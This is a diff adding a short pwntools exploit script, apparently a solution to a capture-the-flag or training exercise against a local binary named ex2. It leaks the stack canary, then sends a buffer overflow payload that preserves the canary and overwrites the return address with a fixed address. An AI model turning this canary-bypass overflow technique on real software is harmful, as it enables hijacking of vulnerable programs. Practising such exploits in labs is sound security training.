@@ -1,0 +1,21 @@
+from pwn import *
+
+#p = gdb.debug(args=['./ex0'],gdbscript='r')
+
+p=process('./ex2')
+
+
+
+#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
+
+
+
+context.log_level='debug'
+
+p.sendline('2')
+canary = int(p.recvuntil('\n').strip())
+if canary < 0:
+	canary = canary + 0x100000000
+payload = (b'a'*0x8) + p32(canary) +  (b'b'*0xc) + p32(0x08048530) #'\x58\x84\x04\x08'
+p.sendline(payload)
+p.recvuntil('Cool')
